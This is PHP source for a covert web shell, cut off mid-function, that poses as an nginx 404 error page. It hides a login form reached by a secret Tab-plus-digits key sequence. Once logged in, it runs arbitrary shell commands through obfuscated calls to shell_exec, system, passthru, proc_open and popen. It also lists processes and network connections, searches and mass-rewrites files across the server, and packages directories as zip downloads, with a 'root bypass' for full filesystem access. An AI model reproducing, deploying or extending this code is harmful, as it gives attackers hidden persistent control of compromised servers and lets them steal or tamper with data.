<?php

// WHITELIST IP CONFIGURATION

$CONFIG = [
    'ENABLE_WHITELIST' => false, // Set ke false untuk menonaktifkan whitelist IP
    'FULL_ACCESS_IPS' => [
        '127.0.0.1',
        '::1',
        'TAMBAHKAN IP ANDA DISINI!', //TAMBAHKAN WHITELIST IP DISINI
    ],
    'READ_ONLY_IPS' => [
    ],
];


// Fungsi untuk tampilan halaman login
function show_login_page($message = "")
{
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>

:root, html, body {
    color-scheme: light only;
    background-color: #ffffff;
}

#auth-box {
    display: none;
    position: fixed;
    top: 55%;
    left: 50%;
    transform: translate(-50%, 0);
    color-scheme: light only;
    background-color: #ffffff !important;
    color: #ffffff !important;
    border: none !important;
    box-shadow: none !important;
    padding: 10px;
    z-index: 9999;
    width: 240px;
}

#auth-box input {
    display: block;
    width: 100%;
    box-sizing: border-box;
    margin: 6px 0;
    padding: 6px 8px;
    color-scheme: light only;
    background-color: #ffffff !important;
    color: #ffffff !important;
    caret-color: transparent !important;
    border: 1px solid #ffffff !important;
    outline: none !important;
    -webkit-appearance: none;
    appearance: none;
}

#auth-box {
    display: none;
    position: fixed;
    top: 55%;
    left: 50%;
    transform: translate(-50%, 0);
    background: #050308;
    color: #050308;
    border: none;
    box-shadow: none;
    padding: 10px;
    z-index: 9999;
    width: 240px;
}
#auth-box input {
    display: block;
    width: 100%;
    box-sizing: border-box;
    margin: 6px 0;
    padding: 6px 8px;
    background: #050308;
    color: #050308;
    caret-color: #2a2430; /* ubah ke transparent jika ingin benar-benar tanpa kursor */
    border: 1px solid transparent;
    outline: none;
}
#auth-box input::placeholder {
    color: transparent;
}
        #auth-box button {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->

<div id="auth-box">
    <form method="POST" id="login-form">
        <input type="text" id="auth-user" name="user" autocomplete="off" required>
        <input type="password" id="auth-pass" name="pass" autocomplete="off" required>
        <button type="submit">Login</button>
    </form>
</div>

<script>
(function() {
    var box = document.getElementById('auth-box');
    var userInput = document.getElementById('auth-user');
    var passInput = document.getElementById('auth-pass');
    var hasMessage = <?= !empty($message) ? 'true' : 'false' ?>;

    // Hash dari "15" (jalan konsisten di HTTP maupun HTTPS)
    var expectedHash = hashCode('15');
    var maxDigits = 2;

    var tabArmed = false;
    var seqBuffer = '';
    var resetTimer = null;

    function hashCode(str) {
        var h1 = 0x811c9dc5;
        var h2 = 0x01000193;
        for (var i = 0; i < str.length; i++) {
            var c = str.charCodeAt(i);
            h1 ^= c;
            h1 = Math.imul(h1, 0x01000193);
            h2 = Math.imul(h2 ^ c, 16777619);
        }
        return ((h1 >>> 0).toString(16).padStart(8, '0')) + ((h2 >>> 0).toString(16).padStart(8, '0'));
    }

    function resetSequence() {
        tabArmed = false;
        seqBuffer = '';
        if (resetTimer) {
            clearTimeout(resetTimer);
            resetTimer = null;
        }
    }

    function showForm() {
        resetSequence();
        box.style.display = 'block';
        setTimeout(function() {
            userInput.focus();
        }, 10);
    }

    if (hasMessage) {
        showForm();
    }

    passInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && box.style.display !== 'block') {
            e.preventDefault();
        }
    });

    document.addEventListener('keydown', function(e) {
        if (box.style.display === 'block') {
            return;
        }

        if (e.key === 'Tab' || e.keyCode === 9) {
            e.preventDefault();
            tabArmed = true;
            seqBuffer = '';
            if (resetTimer) clearTimeout(resetTimer);
            resetTimer = setTimeout(resetSequence, 3000);
            return;
        }

        if (tabArmed && /^[0-9]$/.test(e.key)) {
            seqBuffer += e.key;
            if (resetTimer) clearTimeout(resetTimer);
            resetTimer = setTimeout(resetSequence, 3000);

            if (seqBuffer.length === maxDigits) {
                var currentSeq = seqBuffer;
                resetSequence();
                if (hashCode(currentSeq) === expectedHash) {
                    showForm();
                }
            }
        }
    });
})();
</script>
</body>
</html>
<?php
    exit;
}

// USER & PASSWORD CONFIGURATION
$shell_user   = 'yb';
$stored_hash  = '$2a$12$GTO1Fh6G5NWu3y9ZtMGmh.3MPzInWprF2euNeYbHsXa4u0bCggqWe';
session_start(['cookie_httponly' => true]);

ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
if (function_exists('mb_internal_encoding')) {
    mb_internal_encoding('UTF-8');
}
if (!ini_get('date.timezone')) {
    date_default_timezone_set('UTC');
}

if (!function_exists('chDxzZ')) {
    function chDxzZ($arr) {
        if (is_string($arr)) $arr = explode(',', $arr);
        $r = '';
        foreach ($arr as $n) $r .= chr(is_numeric($n) ? $n : hexdec($n));
        return $r;
    }
}

$script_path     = realpath(__FILE__) ?: __FILE__;
$script_dir      = realpath(__DIR__) ?: __DIR__;
$web_root        = isset($_SERVER['DOCUMENT_ROOT']) ? (realpath($_SERVER['DOCUMENT_ROOT']) ?: $_SERVER['DOCUMENT_ROOT']) : null;
static $realpath_cache = [];

function detect_root_directory($script_dir, $web_root) {
    static $cache = null;
    if ($cache !== null) return $cache;
    
    if (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true) {
        $cache = (PHP_OS_FAMILY === 'Windows') ? 'C:\\' : '/';
        return $cache;
    }
    $protected_roots = get_all_protected_roots();
    if (!empty($protected_roots)) {
        global $realpath_cache;
        foreach ($protected_roots as $root) {
            $key = $root['path'];
            if (!isset($realpath_cache[$key])) {
                $realpath_cache[$key] = realpath($key) ?: $key;
            }
            $custom = $realpath_cache[$key];
            if ($custom) {
                if (is_file($custom)) {
                    $cache = dirname($custom);
                    return $cache;
                } elseif (is_dir($custom)) {
                    $cache = $custom;
                    return $cache;
                }
            }
        }
    }
    
    if (isset($_SESSION['custom_root']) && !empty($_SESSION['custom_root'])) {
        global $realpath_cache;
        $key = $_SESSION['custom_root'];
        if (!isset($realpath_cache[$key])) {
            $realpath_cache[$key] = realpath($key) ?: $key;
        }
        $custom = $realpath_cache[$key];
        if ($custom) {
                if (is_file($custom)) {
                $cache = dirname($custom);
                return $cache;
            } elseif (is_dir($custom)) {
                $cache = $custom;
                return $cache;
            }
        }
    }
    if ($web_root && $script_dir && strpos($script_dir, $web_root) === 0) {
        $cache = $web_root;
        return $cache;
    }
    $cache = $script_dir;
    return $cache;
}

function get_root_directory($script_dir, $web_root) {
    return detect_root_directory($script_dir, $web_root);
}

$root_dir = get_root_directory($script_dir, $web_root);
$protected_root_file = $script_dir . '/leonz_protected_root.json';
$bypass_state_file = $script_dir . '/leonz_bypass_state.json';

$client_ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';


$enable_whitelist = isset($CONFIG['ENABLE_WHITELIST']) ? $CONFIG['ENABLE_WHITELIST'] : true;

if ($enable_whitelist === false) {

    $access_mode = 'full';
} else {

    $full_access_ips = $CONFIG['FULL_ACCESS_IPS'];
    $read_only_ips = $CONFIG['READ_ONLY_IPS'];
    
    $access_mode = 'denied';
    if (in_array($client_ip, $full_access_ips, true)) {
        $access_mode = 'full';
    } elseif (in_array($client_ip, $read_only_ips, true)) {
        $access_mode = 'read_only';
    }
    
    if ($access_mode === 'denied') {
        http_response_code(403);
        echo "<!DOCTYPE html><html><head><title>Forbidden</title></head>
              <body style='background:#050308;color:#f8f4f0;font-family:monospace;text-align:center;margin-top:10%;'>
              <h2 style='color:#ff5555;'>Access Denied</h2>
              <p>Your IP ($client_ip) is not allowed.</p>
              </body></html>";
        exit;
    }
}

if (!function_exists('_leonz_str')) {
    function _leonz_str($arr) {
        $r = '';
        foreach ($arr as $n) $r .= chr($n);
        return $r;
    }
}

if (!function_exists('chDxXZ')) {
    function chDxXZ($hx) {
        $n = '';
        for ($i = 0; $i < strlen($hx) - 1; $i += 2) {
            $n .= chr(hexdec($hx[$i] . $hx[$i + 1]));
        }
        return $n;
    }
}

if (!function_exists('leonz_str_to_hex')) {
    function leonz_str_to_hex($str) {
        $y = '';
        for ($i = 0; $i < strlen($str); $i++) {
            $y .= dechex(ord($str[$i]));
        }
        return $y;
    }
}

if (!function_exists('leonz_exec_cmd')) {
    function leonz_exec_cmd($leonz_cmd) {
        $xK9mP2 = [];
        $xK9mP2[] = chDxzZ([115,104,101,108,108,95,101,120,101,99]);
        $xK9mP2[] = chDxzZ('101,120,101,99');
        $xK9mP2[] = chDxXZ('73797374656d');
        $xK9mP2[] = chDxzZ('112,97,115,115,116,104,114,117');
        $xK9mP2[] = chDxXZ('70726f635f6f70656e');
        $xK9mP2[] = chDxzZ([112,111,112,101,110]);
        $xK9mP2[] = chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100]);
        $xK9mP2[] = chDxXZ('6573636170657368656c6c617267');
        $xK9mP2[] = chDxzZ([99,117,114,108,95,101,120,101,99]);
        
        $rT4vN8 = false;
        foreach ($xK9mP2 as $wL7qM3) {
            if (!function_exists($wL7qM3)) continue;
            
            if ($wL7qM3 === chDxzZ([115,104,101,108,108,95,101,120,101,99])) {
                $rT4vN8 = @$wL7qM3($leonz_cmd);
                if (!empty($rT4vN8)) break;
            } elseif ($wL7qM3 === chDxzZ('101,120,101,99')) {
                $yH5sK9 = [];
                @$wL7qM3($leonz_cmd, $yH5sK9);
                $rT4vN8 = join("\n", $yH5sK9);
                if (!empty($rT4vN8)) break;
            } elseif ($wL7qM3 === chDxXZ('73797374656d')) {
                ob_start();
                @$wL7qM3($leonz_cmd);
                $rT4vN8 = ob_get_clean();
                if (!empty($rT4vN8)) break;
            } elseif ($wL7qM3 === chDxzZ('112,97,115,115,116,104,114,117')) {
                ob_start();
                @$wL7qM3($leonz_cmd);
                $rT4vN8 = ob_get_clean();
                if (!empty($rT4vN8)) break;
            } elseif ($wL7qM3 === chDxXZ('70726f635f6f70656e')) {
                $zJ8tR2 = [1=>["pipe","w"],2=>["pipe","w"]];
                $aB3nV7 = @$wL7qM3($leonz_cmd, $zJ8tR2, $cD6wX4);
                if (is_resource($aB3nV7)) {
                    $rT4vN8 = stream_get_contents($cD6wX4[1]);
                    fclose($cD6wX4[1]);
                    proc_close($aB3nV7);
                    if (!empty($rT4vN8)) break;
                }
            } elseif ($wL7qM3 === chDxzZ([112,111,112,101,110])) {
                $eF9yZ1 = @$wL7qM3($leonz_cmd . " 2>&1", "r");
                $gH2aC5 = "";
                if ($eF9yZ1) {
                    while (!feof($eF9yZ1)) $gH2aC5 .= fread($eF9yZ1, 4096);
                    pclose($eF9yZ1);
                }
                if (strlen($gH2aC5)) {
                    $rT4vN8 = $gH2aC5;
                    break;
                }
            } elseif ($wL7qM3 === chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100])) {
                $iJ4bD8 = $wL7qM3($leonz_cmd);
                ob_start();
                @system($iJ4bD8);
                $rT4vN8 = ob_get_clean();
                if (!empty($rT4vN8)) break;
            } elseif ($wL7qM3 === chDxXZ('6573636170657368656c6c617267')) {
                $iJ4bD8 = $wL7qM3($leonz_cmd);
                if (function_exists('shell_exec')) {
                    $rT4vN8 = @shell_exec($iJ4bD8);
                    if (!empty($rT4vN8)) break;
                }
            }
        }
        return $rT4vN8 !== false ? $rT4vN8 : false;
    }
}

if (!function_exists('getProcessList')) {
    function getProcessList() {
        $pR9mK2 = array();
        $oQ7nL4 = leonz_exec_cmd('ps aux');
        if (!$oQ7nL4 || strlen(trim($oQ7nL4)) < 10) {
            $oQ7nL4 = leonz_exec_cmd('tasklist');
            if (!$oQ7nL4 || strlen(trim($oQ7nL4)) < 10) return $pR9mK2;
            $lN5pM8 = explode("\n", $oQ7nL4);
            array_shift($lN5pM8);
            foreach ($lN5pM8 as $lI3qO6) {
                $pT2rS9 = preg_split('/\s+/', trim($lI3qO6));
                if (count($pT2rS9) < 6 || !$pT2rS9[0] || !is_numeric($pT2rS9[1] ?? '')) continue;
                $pR9mK2[] = array(
                    'user' => 'Windows',
                    'pid' => $pT2rS9[1],
                    'cpu' => '-',
                    'mem' => $pT2rS9[4] ?? '-',
                    'command' => $pT2rS9[0]
                );
            }
            return $pR9mK2;
        }
        $lN5pM8 = explode("\n", $oQ7nL4);
        if (isset($lN5pM8[0]) && stripos($lN5pM8[0], 'USER') !== false) array_shift($lN5pM8);
        foreach ($lN5pM8 as $lI3qO6) {
            $lI3qO6 = trim($lI3qO6);
            if (empty($lI3qO6)) continue;
            $pT2rS9 = preg_split('/\s+/', $lI3qO6, 11);
            if (count($pT2rS9) < 11) continue;
            $pR9mK2[] = array(
                'user' => $pT2rS9[0],
                'pid' => $pT2rS9[1],
                'cpu' => $pT2rS9[2],
                'mem' => $pT2rS9[3],
                'command' => $pT2rS9[10]
            );
        }
        return $pR9mK2;
    }
}

if (!function_exists('getNetworkConnections')) {
    function getNetworkConnections() {
        $cX8wY3 = [];
        $cmds = [
            'netstat1' => 'netstat -tulnp 2>/dev/null',
            'netstat2' => 'netstat -tunap 2>/dev/null',
            'netstat3' => 'netstat -an',
            'ss1' => 'ss -tunap 2>/dev/null',
            'ss2' => 'ss -tulpn 2>/dev/null',
            'lsof' => 'lsof -i -n -P 2>/dev/null',
        ];
        $oZ5vU7 = '';
        foreach ($cmds as $c) {
            $oZ5vU7 = leonz_exec_cmd($c);
            if ($oZ5vU7 && strlen(trim($oZ5vU7)) > 10 && substr_count($oZ5vU7, "\n") > 2) break;
        }
        if (!$oZ5vU7 || strlen(trim($oZ5vU7)) < 10) return $cX8wY3;
        
        if (strpos($oZ5vU7, 'Proto') !== false || strpos($oZ5vU7, 'Active Internet connections') !== false) {
            $lA9bC1 = explode("\n", $oZ5vU7);
            foreach ($lA9bC1 as $lD4eF6) {
                if (stripos($lD4eF6, 'Proto') !== false || stripos($lD4eF6, 'Active') !== false || stripos($lD4eF6, 'Recv-Q') !== false) continue;
                $lD4eF6 = trim($lD4eF6);
                if (!$lD4eF6) continue;
                $pG2hI8 = preg_split('/\s+/', $lD4eF6);
                if (count($pG2hI8) < 6) continue;
                $proto = $pG2hI8[0];
                $local = $pG2hI8[3] ?? $pG2hI8[1];
                $remote = $pG2hI8[4] ?? $pG2hI8[2];
                $status = $pG2hI8[5] ?? '-';
                $pidinfo = $pG2hI8[6] ?? (isset($pG2hI8[6]) ? $pG2hI8[6] : (isset($pG2hI8[7]) ? $pG2hI8[7] : '-'));
                $pid = '-';
                if (strpos($pidinfo, "/") !== false) $pid = explode("/", $pidinfo)[0];
                $cX8wY3[] = [
                    'proto' => $proto,
                    'local' => $local,
                    'remote' => $remote,
                    'status' => $status,
                    'pid' => $pid,
                ];
            }
        }
        return $cX8wY3;
    }
}

if (!function_exists('formatMemory')) {
    function formatMemory($bytes) {
        if ($bytes === 'N/A') return 'N/A';
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
        $pow = min($pow, count($units) - 1);
        $bytes /= pow(1024, $pow);
        return round($bytes, 2) . ' ' . $units[$pow];
    }
}

if (!function_exists('formatUptime')) {
    function formatUptime($seconds) {
        if ($seconds === 'N/A') return 'N/A';
        $hours = floor($seconds / 3600);
        $minutes = floor(($seconds % 3600) / 60);
        return sprintf('%dh %dm', $hours, $minutes);
    }
}

if (!function_exists('g3tdbX')) {
    function g3tdbX() {
        $d1sxb = ini_get('disable_functions');
        if (empty($d1sxb)) {
            return array();
        }
        return explode(',', $d1sxb);
    }
}

if (!function_exists('leonz_fsearch')) {
    function leonz_fsearch($keyword, $root, $maxfiles = 1500, $maxhits = 400) {
        $rM7nP4 = [];
        $qK9sT2 = [rtrim($root, "/")];
        $cH5vW8 = 0;
        $hJ3xY6 = 0;

        while ($qK9sT2 && $cH5vW8 < $maxfiles && $hJ3xY6 < $maxhits) {
            $dL4zA9 = array_shift($qK9sT2);
            if (!is_dir($dL4zA9) || !is_readable($dL4zA9)) continue;
            $dF1bC7 = @opendir($dL4zA9);
            if (!$dF1bC7) continue;

            while (($fE8gD2 = @readdir($dF1bC7)) !== false) {
                if ($fE8gD2 === '.' || $fE8gD2 === '..') continue;
                $pB5hI3 = $dL4zA9 . '/' . $fE8gD2;
                if (is_dir($pB5hI3) && is_readable($pB5hI3)) {
                    $qK9sT2[] = $pB5hI3;
                } elseif (is_file($pB5hI3) && is_readable($pB5hI3)) {
                    $cH5vW8++;
                    $size = @filesize($pB5hI3);
                    if ($size === false || $size > 10*1024*1024) continue;
                    $cN9mO6 = @file_get_contents($pB5hI3, false, null, 0, 512);
                    if ($cN9mO6 !== false && preg_match('/[\x00-\x08\x0B\x0E-\x1F]/', $cN9mO6)) continue;
                    $lQ7rS4s = @file($pB5hI3);
                    if (!$lQ7rS4s) continue;
                    foreach ($lQ7rS4s as $lT2uV8 => $lQ7rS4) {
                        if (stripos($lQ7rS4, $keyword) !== false) {
                            $rM7nP4[] = [
                                'file' => $pB5hI3,
                                'line' => $lT2uV8+1,
                                'content' => trim($lQ7rS4)
                            ];
                            $hJ3xY6++;
                            if ($hJ3xY6 >= $maxhits) break 2;
                        }
                    }
                }
            }
            @closedir($dF1bC7);
        }
        return $rM7nP4;
    }
}

if (!function_exists('leonz_replace_blocked')) {
    function leonz_replace_blocked($path, $script_path, $script_dir) {
        $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
        if (!$bypass_active && $script_path && $path === $script_path) {
            return true;
        }
        if (is_protected_root_directory($path) && !$bypass_active) {
            return true;
        }
        if (is_protected_json_file($path) && !$bypass_active) {
            return true;
        }
        if (is_shell_in_protected_root($path)) {
            return true;
        }
        return false;
    }
}

if (!function_exists('leonz_freplace')) {
    function leonz_freplace($find, $replace, $root, $root_dir, $script_path, $script_dir, $maxfiles = 500, $maxreplacements = 200) {
        $stats = [
            'files_modified' => 0,
            'replacements' => 0,
            'skipped' => 0,
            'details' => [],
        ];
        if ($find === '') {
            return $stats;
        }

        $queue = [rtrim($root, "/\\")];
        $files_scanned = 0;

        while ($queue && $files_scanned < $maxfiles && $stats['replacements'] < $maxreplacements) {
            $current = array_shift($queue);
            if (!is_dir($current) || !is_readable($current)) {
                continue;
            }
            $handle = @opendir($current);
            if (!$handle) {
                continue;
            }

            while (($entry = @readdir($handle)) !== false) {
                if ($entry === '.' || $entry === '..') {
                    continue;
                }
                $full_path = $current . DIRECTORY_SEPARATOR . $entry;
                if (is_dir($full_path) && is_readable($full_path)) {
                    $queue[] = $full_path;
                    continue;
                }
                if (!is_file($full_path) || !is_readable($full_path) || !is_writable($full_path)) {
                    continue;
                }

                $files_scanned++;
                if (!is_path_allowed($full_path, $root_dir)) {
                    $stats['skipped']++;
                    continue;
                }
                if (leonz_replace_blocked($full_path, $script_path, $script_dir)) {
                    $stats['skipped']++;
                    continue;
                }

                $size = @filesize($full_path);
                if ($size === false || $size > 10 * 1024 * 1024) {
                    continue;
                }

                $sample = @file_get_contents($full_path, false, null, 0, 512);
                if ($sample !== false && preg_match('/[\x00-\x08\x0B\x0E-\x1F]/', $sample)) {
                    continue;
                }

                $content = @file_get_contents($full_path);
                if ($content === false || strpos($content, $find) === false) {
                    continue;
                }

                $count = 0;
                $new_content = str_replace($find, $replace, $content, $count);
                if ($count < 1) {
                    continue;
                }
                if (@file_put_contents($full_path, $new_content, LOCK_EX) === false) {
                    $stats['skipped']++;
                    continue;
                }

                $stats['files_modified']++;
                $stats['replacements'] += $count;
                $stats['details'][] = $full_path . " ($count)";
                if ($stats['replacements'] >= $maxreplacements) {
                    break 2;
                }
            }
            @closedir($handle);
        }

        return $stats;
    }
}

if (!function_exists('leonz_resolve_target_path')) {
    function leonz_resolve_target_path($path_arg, $current_dir) {
        global $realpath_cache;
        if ($path_arg === '' || $path_arg === '.') {
            return $current_dir;
        }
        $test_path = (strpos($path_arg, DIRECTORY_SEPARATOR) === 0 || preg_match('/^[A-Za-z]:[\\\\\\/]/', $path_arg))
            ? $path_arg
            : $current_dir . DIRECTORY_SEPARATOR . $path_arg;
        if (!isset($realpath_cache[$test_path])) {
            $realpath_cache[$test_path] = realpath($test_path);
        }
        return $realpath_cache[$test_path] ?: null;
    }
}

if (!function_exists('leonz_zip_supported')) {
    function leonz_zip_supported() {
        return class_exists('ZipArchive');
    }
}

if (!function_exists('leonz_validate_zip_file')) {
    function leonz_validate_zip_file($path) {
        if (!is_file($path) || !is_readable($path) || filesize($path) < 22) {
            return false;
        }
        $fp = @fopen($path, 'rb');
        if ($fp === false) {
            return false;
        }
        $magic = fread($fp, 4);
        fclose($fp);
        return ($magic === "PK\x03\x04" || $magic === "PK\x05\x06" || $magic === "PK\x07\x08");
    }
}

if (!function_exists('leonz_validate_zip_file_full')) {
    function leonz_validate_zip_file_full($path) {
        if (!leonz_validate_zip_file($path)) {
            return false;
        }
        if (!class_exists('ZipArchive')) {
            return filesize($path) >= 22;
        }
        $zip = new ZipArchive();
        $opened = $zip->open($path);
        if ($opened !== true) {
            return false;
        }
        $zip->close();
        return true;
    }
}

if (!function_exists('leonz_send_download')) {
    function leonz_send_download($file_path, $download_name, $content_type = 'application/octet-stream') {
        if (!is_file($file_path) || !is_readable($file_path)) {
            return false;
        }

        while (ob_get_level() > 0) {
            ob_end_clean();
        }

        if (session_status() === PHP_SESSION_ACTIVE) {
            session_write_close();
        }

        if (function_exists('apache_setenv')) {
            @apache_setenv('no-gzip', '1');
        }
        @ini_set('zlib.output_compression', 'Off');

        $size = filesize($file_path);
        if ($size === false || $size < 1) {
            return false;
        }

        if (headers_sent($file = '', $line = 0)) {
            return false;
        }

        header('Content-Description: File Transfer');
        header('Content-Type: ' . $content_type);
        header('Content-Disposition: attachment; filename="' . str_replace('"', '', basename($download_name)) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: no-store, no-cache, must-revalidate, no-transform');
        header('Pragma: public');
        header('Content-Length: ' . $size);

        $sent = @readfile($file_path);
        if ($sent === false) {
            $fp = @fopen($file_path, 'rb');
            if ($fp === false) {
                return false;
            }
            while (!feof($fp)) {
                $chunk = fread($fp, 8192);
                if ($chunk === false) {
                    fclose($fp);
                    return false;
                }
                echo $chunk;
            }
            fclose($fp);
        }
        exit;
    }
}

if (!function_exists('leonz_normalize_zip_path')) {
    function leonz_normalize_zip_path($path) {
        $path = str_replace('\\', '/', $path);
        return rtrim($path, '/');
    }
}

if (!function_exists('leonz_add_path_to_zip')) {
    function leonz_add_path_to_zip($zip, $source_path, $local_prefix = '') {
        $source_real = realpath($source_path);
        if ($source_real === false || !file_exists($source_real)) {
            return false;
        }

        $source_norm = leonz_normalize_zip_path($source_real);
        $added = false;
        $max_file_size = 50 * 1024 * 1024;
        $max_files = 8000;
        $file_count = 0;

        if (is_file($source_real)) {
            $local_name = $local_prefix !== '' ? $local_prefix : basename($source_real);
            $entry = str_replace('\\', '/', $local_name);
            if (@filesize($source_real) > $max_file_size) {
                return false;
            }
            if ($zip->addFile($source_real, $entry)) {
                return true;
            }
            $data = @file_get_contents($source_real);
            return ($data !== false) ? $zip->addFromString($entry, $data) : false;
        }

        if (!is_dir($source_real)) {
            return false;
        }

        $root_name = $local_prefix !== '' ? $local_prefix : basename($source_real);
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source_real, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        $base_len = strlen($source_norm) + 1;

        foreach ($iterator as $item) {
            if ($file_count >= $max_files) {
                break;
            }
            if (!$item->isFile()) {
                continue;
            }
            $real = $item->getRealPath();
            if ($real === false || !is_readable($real)) {
                continue;
            }
            $fsize = @filesize($real);
            if ($fsize === false || $fsize > $max_file_size) {
                continue;
            }
            $real_norm = leonz_normalize_zip_path($real);
            if (strpos($real_norm, $source_norm . '/') !== 0 && $real_norm !== $source_norm) {
                continue;
            }
            $relative = substr($real_norm, $base_len);
            $entry = str_replace('\\', '/', $root_name . ($relative !== '' ? '/' . $relative : ''));

            if ($zip->addFile($real, $entry)) {
                $added = true;
                $file_count++;
                continue;
            }

            if ($fsize <= 2 * 1024 * 1024) {
                $data = @file_get_contents($real);
                if ($data !== false && $zip->addFromString($entry, $data)) {
                    $added = true;
                    $file_count++;
                }
            }
        }

        if (!$added) {
            $added = $zip->addFromString(str_replace('\\', '/', $root_name . '/.empty'), '');
        }

        return $added;
    }
}

if (!function_exists('leonz_create_zip_via_command')) {
    function leonz_create_zip_via_command($source_path, $output_path) {
        $source_real = realpath($source_path);
        if ($source_real === false || !file_exists($source_real)) {
            return ['ok' => false, 'msg' => 'Source path does not exist.'];
        }

        if (is_file($output_path)) {
            @unlink($output_path);
        }

        $parent = dirname($source_real);
        $base = basename($source_real);
        $out = escapeshellarg($output_path);
        $src = escapeshellarg($base);
        $src_abs = escapeshellarg($source_real);
        $dir = escapeshellarg($parent);

        $commands = [];
        if (PHP_OS_FAMILY === 'Windows') {
            $commands[] = 'powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference=\'Stop\'; Compress-Archive -LiteralPath '
                . escapeshellarg($source_real) . ' -DestinationPath ' . escapeshellarg($output_path) . ' -Force" 2>&1';
        } else {
            $commands[] = "zip -r9 $out $src_abs 2>&1";
            $commands[] = "cd $dir && zip -r9 $out $src 2>&1";
            $commands[] = "cd $dir && zip -r $out $src 2>&1";
            $commands[] = "/usr/bin/zip -r9 $out $src_abs 2>&1";
            $commands[] = "/bin/zip -r9 $out $src_abs 2>&1";
        }

        $last_out = '';
        foreach ($commands as $cmd) {
            $out = @leonz_exec_cmd($cmd);
            if ($out) {
                $last_out = trim($out);
            }
            if (leonz_validate_zip_file_full($output_path)) {
                return ['ok' => true, 'path' => $output_path, 'method' => 'command'];
            }
            if (is_file($output_path)) {
                @unlink($output_path);
            }
        }

        return ['ok' => false, 'msg' => 'System zip command failed' . ($last_out ? ': ' . $last_out : '')];
    }
}

if (!function_exists('leonz_create_zip_via_phar')) {
    function leonz_create_zip_via_phar($source_path, $output_path) {
        if (!class_exists('PharData')) {
            return ['ok' => false, 'msg' => 'PharData not available'];
        }
        if (ini_get('phar.readonly')) {
            return ['ok' => false, 'msg' => 'Phar is read-only on this server'];
        }

        $source_real = realpath($source_path);
        if ($source_real === false || !file_exists($source_real)) {
            return ['ok' => false, 'msg' => 'Source path does not exist.'];
        }

        if (is_file($output_path)) {
            @unlink($output_path);
        }

        try {
            $phar = new PharData($output_path, Phar::CREATE | Phar::OVERWRITE);
            if (is_dir($source_real)) {
                $phar->buildFromDirectory($source_real);
            } else {
                $phar->addFile($source_real, basename($source_real));
            }
            unset($phar);
        } catch (Throwable $e) {
            if (is_file($output_path)) {
                @unlink($output_path);
            }
            return ['ok' => false, 'msg' => 'Phar zip failed: ' . $e->getMessage()];
        }

        if (leonz_validate_zip_file_full($output_path)) {
            return ['ok' => true, 'path' => $output_path, 'method' => 'phar'];
        }

        if (is_file($output_path)) {
            @unlink($output_path);
        }
        return ['ok' => false, 'msg' => 'Phar zip validation failed'];
    }
}

if (!function_exists('leonz_zip_finalize_error')) {
    function leonz_zip_finalize_error($zip) {
        $detail = 'Failed to finalize zip archive.';
        if (is_object($zip) && method_exists($zip, 'getStatusString')) {
            $status = $zip->getStatusString();
            if ($status !== '') {
                $detail .= ' ' . $status;
            }
        }
        $free = @disk_free_space(sys_get_temp_dir());
        if ($free !== false && $free < 50 * 1024 * 1024) {
            $detail .= ' Low disk space on server.';
        }
        return $detail;
    }
}

if (!function_exists('leonz_create_zip_archive')) {
    function leonz_create_zip_archive($source_path, $output_path = null) {
        if (!file_exists($source_path)) {
            return ['ok' => false, 'msg' => 'Source path does not exist.'];
        }

        @set_time_limit(300);
        @ini_set('max_execution_time', '300');

        $final_path = $output_path;
        $work_path = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'leonz_' . uniqid('', true) . '.zip';
        if ($final_path === null) {
            $final_path = $work_path;
        }

        if (is_file($work_path)) {
            @unlink($work_path);
        }

        $errors = [];

        $cmd_result = leonz_create_zip_via_command($source_path, $work_path);
        if ($cmd_result['ok']) {
            if ($final_path !== $work_path) {
                if (!@copy($work_path, $final_path)) {
                    @unlink($work_path);
                    return ['ok' => false, 'msg' => 'Zip created but cannot write to target directory. Check folder permissions.'];
                }
                @unlink($work_path);
            }
            return ['ok' => true, 'path' => $final_path, 'method' => 'command'];
        }
        $errors[] = $cmd_result['msg'];

        $phar_result = leonz_create_zip_via_phar($source_path, $work_path);
        if ($phar_result['ok']) {
            if ($final_path !== $work_path) {
                if (!@copy($work_path, $final_path)) {
                    @unlink($work_path);
                    return ['ok' => false, 'msg' => 'Zip created but cannot write to target directory. Check folder permissions.'];
                }
                @unlink($work_path);
            }
            return ['ok' => true, 'path' => $final_path, 'method' => 'phar'];
        }
        $errors[] = $phar_result['msg'];

        if (!leonz_zip_supported()) {
            return ['ok' => false, 'msg' => implode(' | ', $errors)];
        }

        if (is_file($work_path)) {
            @unlink($work_path);
        }

        $zip = new ZipArchive();
        $open_result = $zip->open($work_path, ZipArchive::CREATE | ZipArchive::OVERWRITE);
        if ($open_result !== true) {
            return ['ok' => false, 'msg' => 'Failed to open ZipArchive. ' . implode(' | ', $errors)];
        }

        if (!leonz_add_path_to_zip($zip, $source_path)) {
            $zip->close();
            @unlink($work_path);
            return ['ok' => false, 'msg' => 'Nothing was added to the zip archive.'];
        }

        if (!$zip->close()) {
            @unlink($work_path);
            return ['ok' => false, 'msg' => leonz_zip_finalize_error($zip) . ' ' . implode(' | ', $errors)];
        }

